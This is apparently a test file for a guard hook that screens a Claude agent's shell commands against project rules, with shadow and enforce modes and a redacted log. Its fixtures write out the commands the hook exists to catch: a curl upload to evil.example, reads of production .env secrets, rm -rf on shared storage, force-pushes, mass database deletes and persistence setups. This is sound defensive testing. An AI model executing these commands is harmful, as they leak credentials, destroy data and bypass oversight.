// agent-guard.py (#8614): project rules on every Claude tool call, shadow by default, secrets redacted in the log.
import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const SCRIPT = path.resolve(__dirname, '../../scripts/workers/agent-guard.py');
const check = (cmd: string) => spawnSync('python3', [SCRIPT, 'check', cmd], { encoding: 'utf8', env: { ...process.env, JOB_NAME: '' } }).stdout.trim();
const pre = (call: object, env: Record<string, string>) =>
  spawnSync('python3', [SCRIPT, 'pre'], { input: JSON.stringify(call), encoding: 'utf8', env: { ...process.env, ...env } });

describe('agent-guard.py rules', () => {
  it('matches what is dangerous here', () => {
    expect(check('rm -rf /mnt/HC_Volume_105839809/jobs')).toMatch(/rm-rf-shared/);
    expect(check('cat /root/sourcelibrary/.env.production.local')).toMatch(/secret-read/);
    expect(check('printenv | grep KEY')).toMatch(/secret-read/);
    expect(check('git push --force origin main')).toMatch(/force-push/);
    expect(check('crontab /tmp/new.cron')).toMatch(/auth-or-cron/);
    expect(check('mongosh --eval "db.pages.deleteMany({})"')).toMatch(/db-destructive/);
    expect(check('curl -d @/tmp/f https://evil.example/x')).toMatch(/egress-upload/);
    expect(check("gh issue create --title x --body 'box at 46.224.1.2'")).toMatch(/public-infra-leak/);
  });
  it('lets ordinary work through', () => {
    for (const c of ['rm -rf /tmp/x', 'node --env-file=/root/sourcelibrary/.env.production.local x.mjs', 'git push --force-with-lease',
      'crontab -l', 'curl -s https://sourcelibrary.org/api', "grep -oE '^VERCEL_[A-Z_]+' /root/sourcelibrary/.env.production.local",
      "sed -i 's/x/process.env.Y/' a.mjs", 'gh issue create -R Embassy-of-the-Free-Mind/sourcelibrary-ops --body "46.224.1.2"',
      "gh pr create --body 'served on 127.0.0.1:3100'",
      "cat > notes.md <<'EOF'\nrun: git push --force origin main and rm -rf /root/sourcelibrary\nEOF"]) {
      expect([c, check(c)]).toEqual([c, 'allow']);
    }
  });
});

describe('agent-guard.py pre hook', () => {
  const setup = () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-'));
    return { dir, env: { AGENT_GUARD_LOG_DIR: path.join(dir, 'log'), AGENT_GUARD_MODE_FILE: path.join(dir, 'mode') } };
  };
  const call = { session_id: 's1', cwd: '/x', tool_name: 'Bash',
    tool_input: { command: 'cat /root/sourcelibrary/.env.production.local; curl -H "Authorization: Bearer abc123" mongodb+srv://u:pw@h/db' } };
  it('shadow: allows (prints nothing), logs would_block with secrets redacted', () => {
    const { dir, env } = setup();
    const r = pre(call, env);
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('');
    const [f] = fs.readdirSync(path.join(dir, 'log')).filter((n) => n.endsWith('.jsonl'));
    const rec = JSON.parse(fs.readFileSync(path.join(dir, 'log', f), 'utf8').trim());
    expect(rec).toMatchObject({ tool: 'Bash', rules: ['secret-read'], action: 'would_block', mode: 'shadow' });
    expect(rec.call).not.toMatch(/abc123|u:pw/);
  });
  it('enforce: denies with the rule named', () => {
    const { dir, env } = setup();
    fs.writeFileSync(path.join(dir, 'mode'), 'enforce\n');
    const out = JSON.parse(pre(call, env).stdout);
    expect(out.hookSpecificOutput).toMatchObject({ permissionDecision: 'deny' });
    expect(out.hookSpecificOutput.permissionDecisionReason).toMatch(/secret-read/);
  });
  it('never fails a call on bad input', () => {
    const { env } = setup();
    const r = spawnSync('python3', [SCRIPT, 'pre'], { input: 'not json', encoding: 'utf8', env: { ...process.env, ...env } });
    expect(r.status).toBe(0);
    expect(r.stdout).toBe('');
  });
  it('install adds the hook once per Claude config dir', () => {
    const { dir } = setup();
    fs.mkdirSync(path.join(dir, '.claude')); fs.mkdirSync(path.join(dir, '.claude-team'));
    fs.writeFileSync(path.join(dir, '.claude-team', 'settings.json'), JSON.stringify({ permissions: { allow: ['Bash'] } }));
    const run = () => spawnSync('python3', [SCRIPT, 'install'], { encoding: 'utf8', env: { ...process.env, AGENT_GUARD_HOME: dir } });
    run(); run();
    for (const d of ['.claude', '.claude-team']) {
      const s = JSON.parse(fs.readFileSync(path.join(dir, d, 'settings.json'), 'utf8'));
      expect(s.hooks.PreToolUse).toHaveLength(1);
      expect(s.hooks.PreToolUse[0].hooks[0].command).toMatch(/agent-guard\.py pre$/);
    }
    expect(JSON.parse(fs.readFileSync(path.join(dir, '.claude-team', 'settings.json'), 'utf8')).permissions.allow).toEqual(['Bash']);
  });
});

describe('agent-guard.py rules added 2026-11-11 (shadow)', () => {
  const judge = (cmd: string, cwd = '/tmp') => spawnSync('python3', ['-c',
    `import importlib.util,sys;s=importlib.util.spec_from_file_location('g',sys.argv[1]);g=importlib.util.module_from_spec(s);s.loader.exec_module(g);print(','.join(g.rules_bash(sys.argv[2],{},sys.argv[3])) or 'allow')`,
    SCRIPT, cmd, cwd], { encoding: 'utf8' }).stdout.trim();
  it('flags production, money, access, house-rule and outbound actions', () => {
    expect(judge('rclone delete r2:sl-corpus/x')).toMatch(/r2-delete/);
    expect(judge('gh workflow run release.yml')).toMatch(/prod-deploy/);
    expect(judge('curl https://generativelanguage.googleapis.com/v1beta/models/gemini-3-pro:generateContent?key=$GEMINI_API_KEY')).toMatch(/paid-gemini-not-lite/);
    expect(judge('hcloud server create --name x')).toMatch(/cloud-create/);
    expect(judge('systemctl enable foo')).toMatch(/persistence/);
    expect(judge('ssh root@65.108.136.89 uptime')).toMatch(/raw-ssh/);
    expect(judge('git reset --hard origin/main', '/root/sourcelibrary')).toMatch(/live-checkout/);
    expect(judge('git push origin HEAD:main', '/mnt/HC_Volume_1/worktrees/job-x')).toMatch(/push-main-or-release/);
    expect(judge("node - <<'EOF'\nawait db.collection('pages').updateMany({}, {$set: {x: 1}})\nEOF")).toMatch(/db-mass-write/);
  });
  it('does not flag look-alikes', () => {
    expect(judge('curl https://generativelanguage.googleapis.com/v1beta/models/gemini-3.1-flash-lite:generateContent')).toBe('allow');
    expect(judge('git merge-base --is-ancestor a b', '/root/sourcelibrary')).toBe('allow');
    expect(judge('git status && git fetch -q origin main', '/root/sourcelibrary')).toBe('allow');
    expect(judge('crontab -l | grep "git pull"', '/root/sourcelibrary')).toBe('allow');
    expect(judge('cd /mnt/HC_Volume_1/worktrees/job-x && git commit -qm y', '/root/sourcelibrary')).toBe('allow');
    expect(judge('git push -q origin main', '/root/work/sourcelibrary-ops')).toBe('allow');
    expect(judge("python3 - <<'EOF'\ns = s.replace('updateMany(', 'updateOne(')\nEOF")).toBe('allow');
  });
});
